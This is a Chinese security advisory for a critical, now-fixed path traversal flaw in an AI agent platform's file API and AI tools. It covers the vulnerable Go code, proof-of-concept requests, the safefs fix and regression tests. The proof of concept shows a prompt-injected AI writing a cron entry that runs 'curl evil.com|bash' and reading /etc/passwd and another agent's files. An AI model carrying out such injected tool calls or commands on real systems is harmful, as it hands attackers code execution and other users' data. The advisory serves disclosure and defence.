# B001 · 路径穿越（API + AI 工具）

> **严重度**: 🔴 CRITICAL
> **状态**: ✅ 已修复 26.5.10v2 (commits 714bf8d, 5eeea08, 8ac513c, 2657538)
> **报告人**: aiteam QA
> **CVE 申请建议**: 强烈推荐走 GitHub Security Advisory

---

## 影响

未授权用户 / 被注入的 AI 可以：
1. **跨 agent 读写文件**：通过 `GET /api/agents/alice/files/../alice-evil/secret.md`
2. **AI 任意文件系统访问**：`read("/etc/passwd")` / `write("/etc/cron.d/poison", ...)` / `edit("/var/log/...", ...)`
3. **Symlink 逃逸**：在 workspace 内放符号链接 → `/etc`，prefix 校验通过后跟随

## 漏洞代码

### 漏洞 1：API 层（兄弟前缀混淆）

`internal/api/files.go::resolveWorkspacePath` 与 `internal/api/projects.go::resolve`：

```go
cleaned := filepath.Clean(relPath)
absPath := filepath.Join(ag.WorkspaceDir, cleaned)
if !strings.HasPrefix(absPath, ag.WorkspaceDir) {  // ⚠️ 无 separator 边界
    return forbidden
}
```

PoC：
```
WorkspaceDir = /data/agents/alice
请求 GET /api/agents/alice/files/../alice-evil/secret.md
filepath.Join → /data/agents/alice-evil/secret.md
HasPrefix("/data/agents/alice-evil/secret.md", "/data/agents/alice") = TRUE  ⚠️
```
("alice" 是 "alice-evil" 的字符前缀)

### 漏洞 2：AI 工具层（绝对路径直接放行）

`pkg/tools/registry.go::resolvePath`：

```go
func (r *Registry) resolvePath(p string) string {
    if filepath.IsAbs(p) {
        return p   // ⚠️ 直接放行
    }
    return filepath.Join(r.workspaceDir, p)  // ⚠️ 无 base 边界检查
}
```

被以下 AI 暴露工具使用：`read` / `write` / `edit` / `grep` / `glob`。

PoC：
```python
# 通过 prompt injection 让 AI 调用：
read({"file_path": "/etc/passwd"})            # 任意读
write({"file_path": "/etc/cron.d/x", "content": "* * * * * curl evil.com|bash"})  # 提权
read({"file_path": "/data/agents/other/SOUL.md"})  # 跨 agent 信息泄露
```

### 漏洞 3：Symlink TOCTOU

任一 prefix 校验通过后，`os.ReadFile` / `os.Open` 跟随符号链接 → 即使 candidate 本身合法，符号链接目标可在 base 外。

## 修复

### 新建 `pkg/safefs/safefs.go::ConfineToBase(base, rel)`

抵御 5 类攻击：
1. 相对 `..` 逃逸
2. 兄弟前缀混淆（用 `base + os.PathSeparator` 边界对齐）
3. 绝对路径注入（rel 必须 relative，否则 ErrAbsoluteRel）
4. Symlink TOCTOU（`evalSymlinksOfDeepestExisting` 找到 candidate 最深存在祖先做 EvalSymlinks）
5. NUL 字节注入

### 切换调用方

| 文件 | 旧逻辑 | 新逻辑 |
|------|------|------|
| `internal/api/files.go::resolveWorkspacePath` | `filepath.Clean + Join + HasPrefix` | `safefs.ConfineToBase` |
| `internal/api/projects.go::resolve` | 同上 | `safefs.ConfineToBase` |
| `pkg/tools/registry.go::resolvePath` | `IsAbs ? p : Join` | 拒绝 abs 不在 ws 内 + `safefs.ConfineToBase` |

### 内部 trusted joins 保留

`filepath.Join(workspaceDir, "skills/{id}/SKILL.md")` 等由代码构造、不接受用户输入的路径不动。

## 测试覆盖

| 文件 | 用例数 | 关键回归 |
|------|------|------|
| `pkg/safefs/safefs_test.go` | 12 | `TestConfineToBase_RejectsSiblingPrefixConfusion` |
| `internal/api/files_security_test.go` | 6 | `TestB001_RejectsSiblingPrefixBypass`（HTTP 层） |
| `pkg/tools/registry_safefs_test.go` | 9 | `TestB001Tools_ReadSiblingPrefixBypassRejected`（工具层） |
| `pkg/tools/tools_test.go` | +1 | `absolute_path_outside_workspace_rejected` |
| **合计** | **27 新 + 1 行为变更** | 全绿 |

`go test -race -count=1 ./...` 全包绿。

## 行为变更

- AI 工具不再接受跳出 workspace 的绝对路径（`read("/etc/passwd")` 现报错）
- 跨 agent API 访问被 403 拦截
- 兼容：绝对路径解析后仍在 workspace 内的，依然接受（工具间传递 abs path 场景）

## 升级建议

- ✅ **立即升级**：所有自托管实例
- ⚠️ **CVE 流程**：建议项目方走 GitHub Security Advisory 私下报
- 🔄 **回滚**：本版无 schema 变更，可 `git revert` 安全回滚（但 ZyHive 主分支主张前进修复）
- 📝 **AI 工作流影响**：检查现有 prompt 是否依赖绝对路径

## 提交记录

```
714bf8d feat(safefs): pkg/safefs.ConfineToBase — 抵御 5 类路径穿越攻击 (B001 修复基础)
5eeea08 fix(security/B001): /api/agents/:id/files & /api/projects/:id/files 切到 safefs
8ac513c fix(security/B001): pkg/tools/registry.go::resolvePath 切到 safefs (AI 工具最大攻击面)
2657538 docs(release): 26.5.10v2 — B001 路径穿越 CRITICAL 安全修复 CHANGELOG
```
